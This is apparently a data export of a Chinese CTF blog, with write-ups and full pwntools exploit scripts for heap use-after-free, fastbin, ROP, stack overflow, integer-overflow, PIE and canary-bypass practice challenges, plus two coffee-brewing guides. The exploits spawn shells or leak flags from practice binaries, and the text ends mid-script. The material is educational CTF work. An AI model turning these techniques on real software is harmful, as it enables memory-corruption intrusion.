1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;r = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./pwn-f&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)def add(size,content): r.recvuntil(&quot;3.quit&quot;) r.sendline(&quot;create &quot;) r.recvuntil(&quot;Pls give string size:&quot;) r.sendline(str(size)) r.recvuntil(&quot;str:&quot;) r.sendline(str(content))def free(idx): r.recvuntil(&quot;3.quit&quot;) r.sendline(&quot;delete &quot;) r.recvuntil(&quot;id:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Are you sure?:&quot;) r.sendline(&quot;yes&quot;)add(10,&quot;aaaa&quot;)#chunk0(0x20)add(10,&quot;bbbb&quot;)#chunk1(0x20)free(1)#main_arena =&gt; chunk1free(0)#main_arena=&gt; chunk0 =&gt; chunk1add(25,b&#x27;Start%176$pEnd&#x27;.ljust(24,b&#x27;a&#x27;) + b&#x27;\\xb6&#x27;)#chukn2 ,point to chunk0free(1)#print chunkr.recvuntil(&quot;Start&quot;)libc_start_main = u64(r.recvline(&quot;END&quot;,drop = True))print(hex(libc_start_main))libc_base = libc_start_main - libc.symbols[__libc_start_main]system_addr = libc_base + libc.symbols[system]free(0)add(32,b&quot;/bin/sh;&quot;.ljust(24,b&#x27;a&#x27;) + p64(system_addr))free(1)r.interactive() ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"lab 10 hacknote","slug":"week3-1.2","date":"2022-03-15T13:34:53.564Z","updated":"2022-03-20T04:33:28.424Z","comments":true,"path":"2022/03/15/week3-1.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/15/week3-1.2/","excerpt":"","text":"​ 这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道 ​ 逆一下。 ​ 话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。 ​ 回到这道题，这里的结构体包含两个字段，一个是 print_note_content这个函数的地址，另外一个是结构体的content。 随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响） ​ 0x804865b就是print_note_content函数的地址，然后前面一个估计是堆上的地址。 12if ( *(&amp;notelist + v1) ) (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1)); ​ 接着如果put note，这个print函数就会调用这个print note字段。所以利用思路就是利用UAf然后修改chunk中print note字段的地址为magic()的地址，然后再尝试puts此chunk，就相当于调用了magic()。 ​ 但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。 ​ 需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./hackernote&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)magic = 0x08048986def cmd(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(idx))def add(size,content): cmd(1) p.recvuntil(&#x27;Note size :&#x27;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def free(idx): cmd(2) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))def put(idx): cmd(3) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))add(0x20,b&quot;aabb&quot;)#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]add(0x20,b&quot;aabb&quot;)#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]free(0)#main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)free(1)#fastbin:#main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) #main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)gdb.attach(p)add(8,p32(magic))#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print put(0)p.interactive() ​ ​ ​ 这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。 ​ ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"wustctf2020_easyfast","slug":"week3-1.1","date":"2022-03-15T07:37:41.226Z","updated":"2022-03-20T04:33:25.762Z","comments":true,"path":"2022/03/15/week3-1.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/15/week3-1.1/","excerpt":"","text":"2022-3-15 wustctf2020_easyfastchecksec : ​ 简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。 ​ 首先逆向以后大体的思路是利用这个UAF进行0x602090的地址处的覆盖。 ​ 所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。 ​ 首先add再free两个chunk。 稍微有一个要注意的就是 这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。 1234add(0x40)add(0x40)free(0)free(1) ​ 然后再将此时先被free的chunk的fd覆盖为0x602080 ​ ​ 此时连续add三个chunk，第三个就是我们需要的地址了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27982)else: p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./wustctf2020_easyfast&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)def cmd(idx): p.recvuntil(&#x27;choice&gt;&#x27;) p.sendline(str(idx))def add(size): cmd(1) p.recvuntil(&#x27;size&gt;&#x27;) p.sendline(str(size))def free(idx): cmd(2) p.recvuntil(&#x27;index&gt;&#x27;) p.sendline(str(idx))def edit(idx,content): cmd(3) p.recvuntil(&#x27;index&gt;&#x27;) p.sendline(str(idx)) p.sendline(content) add(0x40)add(0x40)free(0)free(1)gdb.attach(p)edit(0,p64(0x602080))add(0x40)add(0x40)add(0x40)edit(3,p64(0))p.sendafter(&quot;choice&gt;\\n&quot;,&quot;4&quot;)p.interactive() 总结​ 其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"2019_your_pwn","slug":"2019_your_pwn","date":"2022-03-14T10:30:34.805Z","updated":"2022-03-20T04:52:42.256Z","comments":true,"path":"2022/03/14/2019_your_pwn/","link":"","permalink":"https://fuurinko.github.io/2022/03/14/2019_your_pwn/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); ​ 因为是数组越界，每次只能读取一个字节，所以脚本需要循环，首先计算出偏移获取函数的地址，一般来说比较常规的思路是拿libc_start_main ,只是这里的偏移比较远。 ​ ps： 关于如何在看起来比较混乱的栈中找到偏移量这件事 ​ 首先要搞清楚函数逻辑，就是不管有多简单也不能想当然的那种搞清楚。 ​ 这里一共有三个关键的变量，v4，idx和v2，idx是v4数组的索引，用来leak地址。v2用来填content，最后把v2赋给v4[idx]。 ​ 所以在地址上索引的地址和内容是不完全连续的。 ​ ​ 这里2e0是输入的idx，568是需要被泄露的地址，大致的索引应该是648左右，更精确的需要调试得出。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import*#from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;if args[&#x27;REMOTE&#x27;]: p = remote()else: p = process(&#x27;./pwn&#x27;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&#x27;./libc-2.23.so&#x27;)libc_start_main = &#x27;&#x27;one_gadget = 0x45216p.sendafter(&#x27;name&#x27;,&#x27;aa&#x27;)for i in range(638,632,-1): p.recvuntil(&#x27;index\\n&#x27;) p.sendline(str(i)) p.recvuntil(&#x27;(hex) &#x27;) xx = p.recvuntil(&#x27;\\n&#x27;)[:-1] p.recvuntil(&#x27;value\\n&#x27;) p.sendline(&#x27;1&#x27;) if(len(xx)&lt;2): libc_start_main += &#x27;0&#x27; + xx elif(len(xx)==8): libc_start_main += xx[-2:] else: libc_start_main += xx&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;print(hex(libc_start_main))libc_start_main = int(&#x27;0x&#x27; + libc_start_main,16)libc_base = libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]print(hex(libc.symbols[&#x27;__libc_start_main&#x27;]))print(hex(libc_base))one_gadget += libc_base for i in range(6): p.recvuntil(&#x27;index\\n&#x27;) p.sendline(str(344+i)) p.recvuntil(&#x27;value\\n&#x27;) p.sendline(str(ord(p64(one_gadget)[i])))p.interactive()","categories":[{"name":"STACK - ARRAY OUT OF BOUNDS","slug":"STACK-ARRAY-OUT-OF-BOUNDS","permalink":"https://fuurinko.github.io/categories/STACK-ARRAY-OUT-OF-BOUNDS/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"pwn中的python字符串处理问题","slug":"pwn中的python字符串处理问题","date":"2022-03-12T02:50:45.551Z","updated":"2022-03-20T04:32:22.717Z","comments":true,"path":"2022/03/12/pwn中的python字符串处理问题/","link":"","permalink":"https://fuurinko.github.io/2022/03/12/pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 最近在pwncollege做题的时候常常遇到接收的字符串处理不当的问题，故总结整理一下。 字符串截取123456789p.recv()[0:6] #截取1-5个字符串p.recv()[2:6] #截取2-5个字符串p.recv()[:] #截取完整字符串p.recv()[2:]#从第二个索引开始截取p.recv()[-4:]#截取最后四个字符 ​ 字符串处理​ 一般来说我们接收到的数据是字符串的字节流，然后利用pwntools的unpack module来转换为int型。并且 ​ 所以一般来说这样的payload是不会出问题的。 1canary = u64(p.recv()[41:49]) ​ ​ 所以当接收到类似以下的报错： ​ ​ 很大概率并不是数据类型转换的问题，而是本身接收的数据存在问题，比如说接收的数据范围错了，或者根本就没有有效的数据。这个时候关注的重点应该是payload的逻辑本身而不是语法问题。 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ROP","slug":"pwn.college_ROP","date":"2022-03-10T14:12:38.052Z","updated":"2022-03-20T04:32:51.850Z","comments":true,"path":"2022/03/10/pwn.college_ROP/","link":"","permalink":"https://fuurinko.github.io/2022/03/10/pwn.college_ROP/","excerpt":"","text":"写在前面：如果是普通的环境，运行程序可能需要capstone，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里 cp libcapstone.so.5 /lib/x86_64-linux-gnu/ Level1​ 最最最基础的rop了，和前前一个module的前面的有个level一模一样。 1234567891011121314from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level1.0&quot;)win = 0x401b56payload = b&quot;a&quot;*104 + p64(win)p.send(payload)p.interactive() Level2123456789101112131415from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level2.0&quot;)win1 = 0x4022EEwin2 = 0x40239Bpayload = b&quot;a&quot;*88 + p64(win1) + p64(win2)p.send(payload)p.interactive() Level3​ 从这个level差不多沾了一些rop的边了，需要利用ROPgadget来寻找对应的gadget ​ 12345678910111213141516171819202122232425from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level3.0&quot;)win1 = 0x40275Awin2 = 0x402836win3 = 0x402678win4 = 0x402592win5 = 0x402916rdi = 0x402d03payload = b&quot;a&quot;*72 payload += p64(rdi) + p64(1) + p64(win1)payload += p64(rdi) + p64(2) + p64(win2)payload += p64(rdi) + p64(3) + p64(win3)payload += p64(rdi) + p64(4) + p64(win4)payload += p64(rdi) + p64(5) + p64(win5)p.send(payload)p.interactive() ​ Level4​ ​ rop，ret2syscall。 ​ 这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。 （因为如果要orw或者getshell的话似乎还要栈迁移） 12process.write(b&#x27;/flag\\0&#x27;.ljust(88,b&#x27;a&#x27;) + pwn.p64(pop_rax.address)+pwn.p64(90) + pwn.p64(pop_rdi.address)+pwn.p64(input) ...: + pwn.p64(pop_rsi.address) + pwn.p64(0o777) + pwn.p64(syscall.address)) 我魔怔了 顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了） 12345678910111213141516171819202122232425262728from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babyrop_level4.0&quot;)syscall = 0x401a69pop_rdi_ret = 0x401492pop_rax_ret = 0x401a91pop_rsi_ret = 0x401a71p.recvuntil(&quot;[LEAK] Your input buffer is located at: &quot;)input = u64(p.recv()[:12])gdb.attach(p)print(input)payload = b&quot;/flag\\0&quot;.ljust(88,b&#x27;a&#x27;) payload += p64(pop_rax_ret) + p64(90)payload += p64(pop_rdi_ret) + p64(input)payload += p64(pop_rsi_ret) + p64(0o777)payload += p64(syscall)p.send(payload)p.interactive() level5​ 这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"手冲壶","slug":"手冲壶","date":"2022-03-09T16:34:14.000Z","updated":"2022-03-23T12:02:35.561Z","comments":true,"path":"2022/03/10/手冲壶/","link":"","permalink":"https://fuurinko.github.io/2022/03/10/%E6%89%8B%E5%86%B2%E5%A3%B6/","excerpt":"","text":"咖啡豆选择：喜欢比较苦的口感的，请选择“深烘”tag的咖啡豆 喜欢酸中带甜口感的，请选择“浅烘”tag的咖啡豆。 咖啡器具 1）磨制咖啡豆​ 量豆勺量取适量咖啡豆【一勺（豆面与勺面持平）大约4-5g，一杯咖啡建议水粉比为1：18】，抽出磨豆机手柄盖，将咖啡豆倒入后安装手柄，并旋转直到手柄旋转无阻力即可。旋开磨豆机底部的咖啡粉收集器，即可获得磨制好的咖啡豆。 2）冲煮 将滤纸取出放进滤杯，尽量使其平整一些。 把磨好的咖啡粉倒入滤杯。 用手冲壶接适量开水。 加入咖啡粉重量约1.5-2倍的水量以打湿所有的咖啡粉，此时咖啡粉会因为吸水而膨胀。并且会放出一些气体（冒泡）。等冒泡基本结束，咖啡粉堆开始塌陷时，就可以开始接下来的进一步注水（萃取）了。 保持稳定的水流加入需要的全部热水即可，注水到总量后停止，等待萃取结束。如果达到了预定的时间（比如两分钟）后仍然有咖啡液没有流入下杯，应当选择停止萃取，移开承接咖啡液的下壶。 把壶里的咖啡倒进热好的杯子里，趁热喝掉就可以了。 注意 冲煮完咖啡后，请务必清洗分享壶及滤杯用清水洗涤）。 懂哥请忽略以上所有文字，按自己喜爱的方式来，但是记得付钱。 滤纸容易破损，如果有因此造成咖啡豆浪费的，不算钱。 使用完后，记得清理桌面掉落的粉尘或者溅出的水。 ​","categories":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/categories/mess/"}],"tags":[{"name":"coffee","slug":"coffee","permalink":"https://fuurinko.github.io/tags/coffee/"}]},{"title":"法压壶","slug":"法压壶","date":"2022-03-09T16:34:14.000Z","updated":"2022-03-23T12:03:17.073Z","comments":true,"path":"2022/03/10/法压壶/","link":"","permalink":"https://fuurinko.github.io/2022/03/10/%E6%B3%95%E5%8E%8B%E5%A3%B6/","excerpt":"","text":"咖啡豆选择：喜欢比较苦的口感的，请选择“深烘”tag的咖啡豆 喜欢酸中带甜口感的，请选择“浅烘”tag的咖啡豆。 咖啡器具 1）磨制咖啡豆​ 量豆勺量取适量咖啡豆【一勺（豆面与勺面持平）大约4-5g，一杯咖啡建议水粉比为1：18】，抽出磨豆机手柄盖，将咖啡豆倒入后安装手柄，并旋转直到手柄旋转无阻力即可。旋开磨豆机底部的咖啡粉收集器，即可获得磨制好的咖啡豆。 2）冲煮​ 取法压壶，将壶盖以及滤网组成的整体移出，将咖啡豆倒入杯身。接适量开水（整个壶的容量是350ml，一般15g咖啡豆需要三分之二杯身的水），盖上杯盖（滤网不要先压下去），静置4分钟后，将滤网往下压，过滤杯内悬浮的咖啡粉末，最后将咖啡倒入茶杯中）（下面的木头柜子第二层有一次性纸杯）。 注意 冲煮完咖啡后，请务必清洗法压壶（用清水洗涤）。 请注意冲煮时间，如果咖啡粉浸泡过久会造成口感酸涩，非常不好喝（但是没毒） 懂哥请忽略以上所有文字，按自己喜爱的方式来，但是记得付钱。 ​","categories":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/categories/mess/"}],"tags":[{"name":"coffee","slug":"coffee","permalink":"https://fuurinko.github.io/tags/coffee/"}]},{"title":"MemoryErrors","slug":"pwn.college_MemoryErrors","date":"2022-03-03T03:18:50.193Z","updated":"2022-03-25T11:57:38.201Z","comments":true,"path":"2022/03/03/pwn.college_MemoryErrors/","link":"","permalink":"https://fuurinko.github.io/2022/03/03/pwn.college_MemoryErrors/","excerpt":"","text":"​ 视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module） ​ 传输题目到本地可以使用scp命令。 1scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors Level1.0​ 随便溢，覆盖掉变量就行。 Level1.1​ 随便溢。 Level2..0​ 随便溢。 level2.1​ 这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。 ​ 关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。 Level3.0​ 没啥好说的。 123456789101112131415from pwn import*p = process(&quot;/challenge/babymem_level3.0&quot;)win_addr = 0x4019fapayload = &quot;a&quot;*152 + p64(win_addr)p.recvuntil(&quot;Payload size:&quot;)p.sendline(&quot;160&quot;)p.recvuntil(&quot;!&quot;)p.sendline(payload)p.recv()p.interactive() ​ Level3.112345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level3.1&quot;)p = process(&quot;/challenge/babymem_level3.1&quot;)win_addr = 0x401D35payload = b&quot;a&quot;*105 + p64(win_addr)p.send(b&quot;115&quot;)#gdb.attach(p)p.send(payload)p.interactive() ​ 为什么偏移量这么难找。 Level4.0​ 这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。 ​ 注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。 对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。 1234567891011121314151617from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level4.0&quot;)p = process(&quot;/challenge/babymem_level4.0&quot;)#pad = 0x401B5 #0x30win_addr = 0x401B88payload = b&quot;a&quot;*40+ p64(win_addr)p.sendline(b&quot;-999&quot;)#gdb.attach(p)p.send(payload)p.interactive() ​ Level4.1​ 漏洞点： 1if ( (signed int)v5 &gt; 30 ) ​ 依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。 1234567891011121314151617from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level4.1&quot;)p = process(&quot;/challenge/babymem_level4.1&quot;)#pad = 0x401B5 #0x30win_addr = 0x4016A3payload = b&quot;a&quot;*56+ p64(win_addr)p.sendline(b&quot;-999&quot;)#gdb.attach(p)p.send(payload)p.interactive() Level5.0​ 这个题依然是在输入size的地方进行了一定的检测，这里是 12if ( v31 * v32 &gt; 7 ) sub_401150(&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;, &quot;&lt;stdin&gt;&quot;, 143LL, &quot;challenge&quot;); ​ ​ 然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。 ​ 4294967297是1， ​ 18446744073709551617 2147483649 ​ 去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32， 1234567891011121314151617from pwn import*p = process(&quot;/challenge/babymem_level5.0&quot;)win = 0x4022E7#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*136 + p64(win)#80+8 canary:16p.sendline(b&quot;2147483649&quot;)p.sendline(b&quot;2&quot;)p.send(payload)p.interactive() Level5.1123456789101112131415from pwn import*p = process(&quot;/challenge/babymem_level5.1&quot;)win = 0x40173B#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*88 + p64(win)#80+8 canary:16p.sendline(b&quot;2147483649&quot;)p.sendline(b&quot;2&quot;)p.send(payload)p.interactive() Level6.0​ 利用gadget的思想，直接将地址填成flag，而绕过win的检测。 123456789101112131415161718from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level5.0&quot;)p = process(&quot;/challenge/babymem_level6.0&quot;)#gdb.attach(p)#pad = 0x401B5 #0x30win_addr = 0x401693payload = b&quot;a&quot;*152+ p64(win_addr)p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() Level6.1​ 同理。 1234567891011121314151617181920from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level6.1&quot;)#p = process(&quot;/challenge/babymem_level6.1&quot;)gdb.attach(p)#pad = 0x401B5 #0x30win_addr = 0x4013BApayload = b&quot;a&quot;*152+ p64(win_addr)p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() Level7.0​ 开始考pie的绕过了，不走寻常路啊。 ​ 之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。 ​ 地址的后三个字符永远一致，所以只需爆破第四位，就能将retn覆盖成win 。 ​ （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛） 123456789101112131415161718from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level7.0&quot;)p = process(&quot;/challenge/babymem_level7.0&quot;)#gdb.attach(p)#pad = 0x401B5 #0x30payload = b&quot;a&quot;*136+ b&quot;\\xf4\\xbb&quot;p.sendline(&quot;144&quot;)p.recv()p.send(payload)p.interactive() 多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。 Level7.112345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level7.1&quot;)p = process(&quot;/challenge/babymem_level8.0&quot;)#pad = 0x401B5 #0x30payload = b&quot;a&quot;*152+ b&quot;\\xa4\\xb0&quot;p.sendline(&quot;160&quot;)p.recv()#gdb.attach(p)p.send(payload)p.interactive() ​ Level8.0​ 好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。 12345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level8.0&quot;)p = process(&quot;/challenge/babymem_level8.0&quot;)payload = b&#x27;\\x00&#x27;*152 + b&quot;\\xa4\\xb0&quot;p.sendline(&quot;160&quot;)p.recv()p.send(payload)p.interactive() ​ Level8.1​ 同理 1234567891011121314151617from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level8.1&quot;)#p = process(&quot;/challenge/babymem_level8.1&quot;)payload = b&#x27;\\x00&#x27;*104 + b&quot;\\x7e\\x79&quot;p.sendline(&quot;112&quot;)p.recv()gdb.attach(p)p.send(payload)p.interactive() Level9.0​ 以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上\\x60直接绕到canary后覆写。 12345678910111213from pwn import*p = process(&quot;/challenge/babymem_level9.1&quot;)payload = b&#x27;a&#x27;*72+b&quot;\\x60&quot;+ b&quot;\\xbe\\xc5&quot;*6p.sendline(&quot;106&quot;)p.recv()p.send(payload)p.interactive() Level9.1 123456789101112from pwn import*p = process(&quot;/challenge/babymem_level9.1&quot;)payload = b&#x27;a&#x27;*40+b&quot;\\x47&quot;+ b&quot;\\x26\\x46&quot;p.sendline(&quot;77&quot;)p.recv()p.send(payload)p.interactive() ​ n的数量和size都需要精准控制才能拿flag。 Level10.0​ 其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二： 为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0. 这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？ ​ ​ 解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。 ​ ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了） ​ 1234567891011from pwn import*p = process(&quot;/challenge/babymem_level10.0&quot;)payload = b&#x27;a&#x27;*111p.sendline(b&quot;150&quot;)p.send(payload) Level10.1​ 同 12345678910111213from pwn import*p = process(&quot;/challenge/babymem_level10.1&quot;)payload = b&#x27;a&#x27;*79p.sendline(b&quot;150&quot;)p.send(payload)p.interactive() Level11.0​ 也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。 12345678910from pwn import*p = process(&quot;/challenge/babymem_level11.0&quot;)#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2payload = b&#x27;a&#x27;*24577p.sendline(b&quot;24600&quot;)p.send(payload)p.interactive() level11.1​ 同理 ​ （ps：size是我随便填的。但是也不能太随便，得先vmmap看看flag和input buffer被映射到了哪里） 123456789101112from pwn import*p = process(&quot;/challenge/babymem_level11.1&quot;)payload = b&#x27;a&#x27;*12289p.sendline(b&quot;12400&quot;)p.send(payload)p.interactive() level12.0​ 这道题的trick就在于可以反复调用函数challenge，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。 123456789101112131415161718from pwn import*p = process(&quot;/challenge/babymem_level12.0&quot;)payload1 = 